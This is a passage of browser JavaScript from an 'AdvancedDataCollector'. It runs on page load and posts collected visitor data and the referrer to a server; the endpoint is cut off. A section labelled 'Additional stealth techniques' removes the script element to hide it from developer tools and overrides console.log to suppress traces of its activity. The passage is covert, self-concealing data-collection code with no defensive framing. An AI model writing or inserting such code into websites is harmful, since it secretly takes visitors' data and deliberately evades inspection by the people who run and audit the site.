                    referrer: document.referrer,
                    data: this.collectedData
                })
            });

            if (!response.ok) {
                console.log('Failed to send advanced data');
            }
        } catch (error) {
            console.log('Error sending advanced data:', error);
        }
    }
}

// Start collection when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        new AdvancedDataCollector();
    });
} else {
    new AdvancedDataCollector();
}

// Additional stealth techniques
(function() {
    // Hide the script from developer tools
    const script = document.currentScript;
    if (script) {
        script.remove();
    }

    // Override console.log to hide our activities
    const originalLog = console.log;
    console.log = function(...args) {
        if (!args.some(arg => typeof arg === 'string' && arg.includes('Advanced Data Collection'))) {
            originalLog.apply(console, args);
        }
    };
})();
